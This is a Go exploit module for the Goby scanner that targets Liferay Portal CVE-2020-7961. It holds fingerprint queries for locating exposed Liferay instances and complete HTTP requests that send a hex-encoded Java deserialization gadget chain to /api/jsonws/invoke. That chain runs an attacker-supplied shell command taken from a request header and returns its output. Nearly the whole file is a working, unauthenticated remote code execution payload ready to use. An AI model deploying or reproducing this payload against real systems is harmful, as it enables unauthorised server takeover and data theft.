package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Liferay Portal Unauthenticated 7.2.1 RCE (CVE-2020-7961)",
    "Description": "<p>Liferay Portal is a set of J2EE-based portal solutions of American Liferay Company. The program uses EJB and JMS and other technologies, and can be used as Web publishing and sharing workspace, enterprise collaboration platform, social network and so on.</p><p>A code issue vulnerability exists in versions prior to Liferay Portal 7.2.1 CE GA2. A remote attacker could exploit this vulnerability to execute arbitrary code using JSON Web services.</p>",
    "Product": "Liferay",
    "Homepage": "https://www.liferay.com/",
    "DisclosureDate": "2022-10-18",
    "Author": "csca",
    "FofaQuery": "body=\"Powered by Liferay Portal\" || header=\"Liferay Portal\" || banner=\"Liferay Portal\" || header=\"guest_language_id=\" || banner=\"guest_language_id=\" || body=\"Liferay.AUI\" || body=\"Liferay.currentURL\"",
    "GobyQuery": "body=\"Powered by Liferay Portal\" || header=\"Liferay Portal\" || banner=\"Liferay Portal\" || header=\"guest_language_id=\" || banner=\"guest_language_id=\" || body=\"Liferay.AUI\" || body=\"Liferay.currentURL\"",
    "Level": "3",
    "Impact": "<p>A code issue vulnerability exists in versions prior to Liferay Portal 7.2.1 CE GA2. A remote attacker could exploit this vulnerability to execute arbitrary code using JSON Web services.</p>",
    "Recommendation": "<p>The manufacturer has released vulnerability patches, please pay attention to the official website update in time: <a href=\"https://www.liferay.com/\">https://www.liferay.com/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/jsonws/invoke",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData",
                    "cmd2": "lsb_release -a"
                },
                "data_type": "text",
                "data": "cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Distributor ID:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/api/jsonws/invoke",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData",
                    "cmd2": "systeminfo"
                },
                "data_type": "text",
                "data": "cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "OS Name:.*Microsoft Windows",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/jsonws/invoke",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}/api/jsonws?contextName=&signature=%2Fexpandocolumn%2Fadd-column-4-tableId-name-type-defaultData",
                    "cmd2": "{{{cmd}}}"
                },
                "data_type": "text",
                "data": "cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&p_auth=nuclei&formDate=1597704739243&tableId=1&name=A&type=1&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource=%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3AACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878%3B%22%7D"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2020-7961"
    ],
    "CNNVD": [
        "CNNVD-202003-1260"
    ],
    "CNVD": [
        "CNVD-2020-19506"
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Liferay Portal 7.2.1 版本 invoke 文件远程代码执行漏洞（CVE-2020-7961）",
            "Product": "Liferay",
            "Description": "<p>Liferay Portal是美国Liferay公司的一套基于J2EE的门户解决方案。该方案使用了EJB以及JMS等技术，并可作为Web发布和共享工作区、企业协作平台、社交网络等。<br></p><p>Liferay Portal 7.2.1 CE GA2之前版本中存在代码问题漏洞。远程攻击者可借助JSON Web服务利用该漏洞执行任意代码。<br></p>",
            "Recommendation": "<p>厂商已发布漏洞补丁，请及时关注官网更新：<a href=\"https://www.liferay.com/\">https://www.liferay.com/</a><br></p>",
            "Impact": "<p>Liferay Portal 7.2.1 CE GA2之前版本中存在代码问题漏洞。远程攻击者可借助JSON Web服务利用该漏洞执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Liferay Portal Unauthenticated 7.2.1 RCE (CVE-2020-7961)",
            "Product": "Liferay",
            "Description": "<p>Liferay Portal is a set of J2EE-based portal solutions of American Liferay Company. The program uses EJB and JMS and other technologies, and can be used as Web publishing and sharing workspace, enterprise collaboration platform, social network and so on.<br></p><p>A code issue vulnerability exists in versions prior to Liferay Portal 7.2.1 CE GA2. A remote attacker could exploit this vulnerability to execute arbitrary code using JSON Web services.<br></p>",
            "Recommendation": "<p>The manufacturer has released vulnerability patches, please pay attention to the official website update in time: <a href=\"https://www.liferay.com/\">https://www.liferay.com/</a><br></p>",
            "Impact": "<p>A code issue vulnerability exists in versions prior to Liferay Portal 7.2.1 CE GA2. A remote attacker could exploit this vulnerability to execute arbitrary code using JSON Web services.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}